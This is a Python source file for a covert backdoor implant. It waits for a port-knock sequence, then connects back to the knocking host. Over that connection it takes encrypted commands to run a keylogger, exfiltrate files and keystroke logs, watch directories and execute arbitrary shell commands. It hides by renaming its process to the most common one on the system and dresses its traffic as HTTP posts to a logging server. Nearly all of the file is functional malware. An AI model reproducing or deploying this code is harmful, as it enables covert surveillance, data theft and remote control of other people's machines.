import setproctitle
import psutil
from scapy.all import *
from watch import Watch
from keylog import Keylog
from cryptography.fernet import Fernet

ipaddress = []
correct_knocks = []
http_header = b"POST / HTTP/1.1\r\nHost:www.logging-server.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "
http_tail = b"POST / HTTP/1.1\r\nHost:www.logging-server.com\r\nConnection: close\r\n\r\n"
fernet = Fernet(b'JFMnqwIgPTu1BqhqtCN4uPx2d6noxOcXtAbxJB5FrIQ=')

def package(message):
    print(message)
    encoded_message = fernet.encrypt(message.encode())
    return http_header + str(len(encoded_message)).encode() + "\r\n\r\n".encode() + encoded_message

def handle(pkt):
    if pkt['TCP'].flags != "RA":
        src_addr = pkt['IP'].src
        if src_addr not in ipaddress:
            ipaddress.append(src_addr)
            correct_knocks.append("")
        index = ipaddress.index(src_addr)

        if pkt['TCP'].dport == 19634 and pkt['TCP'].sport == 14369:
            correct_knocks[index] += "1"
        if pkt['TCP'].dport == 16343 and pkt['TCP'].sport == 13436:
            correct_knocks[index] += "2"
        if "1" in correct_knocks[index] and "2" in correct_knocks[index]:
            time.sleep(.5)
            print(f"making connection with {src_addr}")
            ipaddress.clear()
            correct_knocks.clear()
            connection(src_addr)


def get_best_process_name():
    process_dict = {}
    for proc in psutil.process_iter():
        try:
            process_name = proc.name()
            if process_name in process_dict:
                process_dict.update({process_name: process_dict.get(process_name) + 1})
            else:
                process_dict[process_name] = 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    best_process_name = next(iter(process_dict))
    for process_name in process_dict:
        if process_dict.get(process_name) > process_dict.get(best_process_name):
            best_process_name = process_name
    print(f"hiding as {best_process_name}")
    return best_process_name


def run_command(command):
    print(command)
    try:
        data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = data.communicate()
    except Exception:
        out = ("psh: command not found: {}".format(command))
    return out.decode()


def send_file(fileName, connection):
    f = open(fileName, 'rb')
    connection.send(package(fileName))
    time.sleep(.1)
    connection.send(package(f'{os.path.getsize(fileName)}'))
    time.sleep(.1)
    while True:
        data = f.read(4096)
        if not data: break
        connection.sendall(data)
    f.close()


def send_directory(dir, connection):
    for path, dirs, files in os.walk(dir):
        for file in files:
            filename = os.path.join(path, file)
            filesize = os.path.getsize(filename)

            print(f'Sending {filename}')

            with open(filename, 'rb') as f:
                time.sleep(.1)
                connection.sendall(package(filename[17:]))
                time.sleep(.1)
                connection.sendall(package(str(filesize)))
                time.sleep(.1)
                while True:
                    data = f.read(4096)
                    if not data: break
                    connection.sendall(data)
    time.sleep(.1)
    connection.sendall(package("-done-"))


def connection(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 80))
        print("connected")
        while True:
            command = s.recv(2048)
            if not command:
                break
            command = fernet.decrypt(command).decode()
            command_type = command.split()[0]
            print(f"command: {command}")
            if command_type == "kstart":
                key_logger.start_keylogger()
                s.sendall(package("keylogger started"))
            elif command_type == "kstop":
                key_logger.stop_keylogger()
                s.sendall(package("keylogger stopped"))
            elif command_type == "kget":
                try:
                    send_file(key_logger.log_file, s)
                    # key_logger.clear_log()
                except Exception as e:
                    s.sendall(package(str(e)))
            elif command_type == "fget":
                send_file(" ".join(command.split()[1:]), s)
            elif command_type == "wstart":
                result = "watch started"
                try:
                    watch.add_watched(" ".join(command.split()[1:]), True)
                    if not watch.started:
                        x = threading.Thread(target=watch.start)
                        x.start()
                except Exception as e:
                    result = str(e)
                s.sendall(package(result))
            elif command_type == "wstop":
                result = "watch stopped"
                try:
                    watch.stop()
                except Exception as e:
                    result = str(e)
                s.sendall(package(result))

            elif command_type == "wget":
                send_directory("/var/tmp/.hiding/", s)
                watch.clear()
            elif command_type == "e":
                s.sendall(package(run_command(" ".join(command.split()[1:]))))
            else:
                s.sendall(package(f"command {command_type} not found"))


if __name__ == '__main__':
    setproctitle.setproctitle(get_best_process_name())
    key_logger = Keylog()
    watch = Watch()
    while True:
        try:
            sniff(filter="tcp and dst port 19634 or (tcp and dst port 16343)", prn=handle)
        except Exception as e:
            print(e)
